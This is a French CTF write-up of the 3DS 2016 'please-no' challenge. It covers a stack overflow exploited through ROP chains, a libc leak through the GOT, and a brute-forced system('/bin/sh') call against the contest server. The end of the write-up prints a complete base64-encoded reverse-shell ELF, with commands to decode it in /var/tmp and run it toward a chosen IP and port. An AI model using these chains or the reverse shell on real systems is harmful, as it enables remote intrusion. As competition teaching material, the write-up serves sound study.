---
layout: post
title: "3DS 2016 CTF"
date: semaine 20 décembre 2016
comments: true
categories: wu
---
Le binaire presente les caractéristiques suivantes:
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```
Il s'agit d'un binaire ne produisant aucune sortie, avec dans son code des fonctions non appelées, le main, se contentant de lire un buffer sur l'entrée standard avec la possibilité de faire un nuffer overflow (PAD="ABCDEFGHIJKLMNOPQRST").
Les fonctions sont less suivantes:
```
e84b0=0x080484b0 #met esp dans ebx
e8ac0=0x08048ac0 #??
e84f0=0x080484f0 #?? (les 2 jouent avec 804a038)
e8580=0x08048580 #fait un exit
e8590=0x08048590 #ouvre le fichier en 804a039=NOM, et le balance sur stdout
e8610=0x08048610 #si esp contient b0b01337, il rajoute .teta à NOM
e8650=0x08048650 #si esp contient b0b01337, il rajoute .text à NOM
e8690=0x08048690 #si esp contient 1b0b0c41 et ae13374e, il rajoute mflag à NOM
e86d0=0x080486d0 #imprime un message What am I doing here?
```
nom est initalement à vide. Il suffit donc d'appeler tour à tour les fonctions e8690, e8650, e8590 et e8580 pour avoir le flag. C'est fonctions se déclenchent si et seulement si la pile contient des octets bien précis.
On a juste besoin de gadgets pop et d'enchainer les fonctions. Cela se fait à l'aide de la chaine suivante:
```
chaine=PAD+p32(e8690)+p32(pop2)+p32(eb1b1)+p32(eb2b2)+p32(e8650)+p32(pop1)+p32(ebobo)+p32(e8590)+p32(e8580)
```
avec 
```
ebobo=0xb0b01337
eb1b1=0x1b0b0c41
eb2b2=0xae13374e
pop1=0x80483c9
pop2=0x0804878a

```
Cette chaine envoyée donne en retour 3DS{n0_symb0l5_w1th_R0P_15_p41nful_r1ght} (flag espéré). À noter que le fichier mflag.teta contient 3DS{why_n0_sym`b0l5_th15_hurt5}

Ce challenge avait une partie bonus. On peut essayer d'avoir un shell sur le serveur. Une première fuite se fait en appelant la fonction printf en demandant le contenu de l'entrée de gets dans la got:

```
getsgot=elf.got['gets']
chainepr=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(e8580)
```
Il est indispensable de sortir correctement du programme faute de quoi aucune sortie n'est récupérée sauf à exécuter plusieurs fois l'impression en bouclant le programme via la chaine
```
chainepr1=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(printfplt)+p32(pop1)+p32(ret)+p32(main)

```
cette chaine fait boucler le programme en rappelant la fonction main, en lui fournissant plusieurs fois la chaine, on finit par provoquer l'envoi du buffer. En tout état de cause on obtient
```
francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ python payplease.py 1
[*] '/home/francois/BFF/beers4flags/writeups/3DS2016/pwn/please-no/please-no'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to 209.190.1.131 on port 9003: Done
[+] Recieving all data: Done (32B)
[*] Closed connection to 209.190.1.131 port 9003
0804a010 :  a0 2a 67 f7   06 84 04 08     16 84 04 08   26 84 04 08       .*g. ....  .... &...  
0804a020 :  80 b1 62 f7   46 84 04 08     56 84 04 08   66 84 04 08       \x80.b. F...  V... f...  
  
\xa0*g��\x16\x84\x0&\x84\x0\x80\xb1b�F�V\x84\x0f\x84\x0
francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ python payplease.py 1
[*] '/home/francois/BFF/beers4flags/writeups/3DS2016/pwn/please-no/please-no'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
[+] Opening connection to 209.190.1.131 on port 9003: Done
[+] Recieving all data: Done (32B)
[*] Closed connection to 209.190.1.131 port 9003
0804a010 :  a0 ea 5f f7   06 84 04 08     16 84 04 08   26 84 04 08       .._. ....  .... &...  
0804a020 :  80 71 5b f7   46 84 04 08     56 84 04 08   66 84 04 08       \x80q[. F...  V... f...  
  
\xa0�_�\x06\x84\x0\x16\x84\x0&\x84\x0\x80q[�F�V\x84\x0f\x84\x0
francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ 
```
Cela permet de constater plusieurs choses:
1) Il y a l'ASLR (avec un entropie classique, un bf est envisageable)
2) Le programme est appelé avec socat ou équivalent
3) La libc est une libc6_2.24-3ubuntu1_i386 d'après la libcdatabase master

Pour obtenir un shell une première tentative a été de forcer la sortie du buffer de stdout en le remplissant, de récupérer le décalgae en mémoire et de renvoyer un payload final. Malheureusement cela n'a pas marché, la sortie a bien lieu au bout d'un certain temps mais sans doute à cause d'un segfault due à une croissance permanent de la valeur d'ESP.
Bref, le bf s'est imposé.
Il suffit donc d'envoyer
```
chainepr3=PAD+p32(system)+p32(pop1)+p32(binsh)+p32(e8580)
```
avec system et binsh l'adresse de system et de /bin/sh dans la libc et un décalage raisonnable arbitraire. Avec un peu d'attente (2-3 minutes), la commande fini par être effectuée. Parfois un message d'erreur apparait
```
please-no: ../iconv/skeleton.c:559: __gconv_transform_internal_ucs2reverse: Assertion `outbufstart == NULL' failed.
```
pas trop d'explications, on ignore.

Le résultat des commandes est le suivant:
Commande 'ls -l ; cat *.*' donne
```
total 24
-rw-r--r--    1 root     root            39 Dec 22 00:05 7bb65090b743cb1cdfa049f56da5017d.txt
-rw-r--r--    1 root     root            31 Dec 20 21:28 mflag
-rw-r--r--    1 root     root            31 Dec 20 21:28 mflag.teta
-rw-r--r--    1 root     root            42 Dec 20 21:28 mflag.text
-rwxr-xr-x    1 root     root          5584 Dec 20 21:28 please-no
3DS{fb1d92953253c7d79b50fbe1c0ca8abd}

3DS{why_n0_symb0l5_th15_hurt5}
3DS{n0_symb0l5_w1th_R0P_15_p41nful_r1ght}
```
ce qui nous donne le flag bonus (je ne sais pas à quoi sert le 3ième flag contenu dans  mflag.teta).

Il est possible de mettre un remoteshell dessus en executant
```
echo "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YXRvbi5jAHN0cnRvdWwuYwBpc3NwYWNlLmMAaXN4ZGlnaXQuYwBjb25uZWN0AGF0b2wAZXJybm8AZXhlY3ZlAGR1cDIAX19mZmx1c2hfc3RkaW4Ac3RydG91bABzb2NrZXQAaXNzcGFjZQBfX2Vudmlyb24AZnRyeWxvY2tmaWxlAGlzeGRpZ2l0AGVudmlyb24Ac29ja2V0Y2FsbABpbmV0X2FkZHIAbnRvaGwAX195b3VfdHJpZWRfdG9fbGlua19hX2RpZXRsaWJjX29iamVjdF9hZ2FpbnN0X2dsaWJjAF9fdnN5c2NhbGwAX3N0YXJ0AF9faXNzcGFjZV9hc2NpaQBfX3RocmVhZF9kb2V4aXQAaHRvbmwAZnVubG9ja2ZpbGUAaW5ldF9hdG9uAF9fYnNzX3N0YXJ0AG1haW4AX191bmlmaWVkX3N5c2NhbGwAX19pc3hkaWdpdF9hc2NpaQBudG9ocwBfX2ZmbHVzaF9zdGRvdXQAX19saWJjX3NvY2tldABmbG9ja2ZpbGUAX2VkYXRhAF9lbmQAaHRvbnMAX19lcnJub19sb2NhdGlvbgBfX2ZmbHVzaF9zdGRlcnIAZXhpdABhdG9pAF9fbm9wAF9leGl0AF9fdW5pZmllZF9zeXNjYWxsXzI1NgBfX2xpYmNfY29ubmVjdAA=" > /var/tmp/rsh```

puis busybox base64 -d /var/tmp/rsh > /var/tmp/rshb et enfin /var/tmp/rshb IP port mais je n'ai tropuvé aucun port accessible en sortie.

cf programmes pythons joints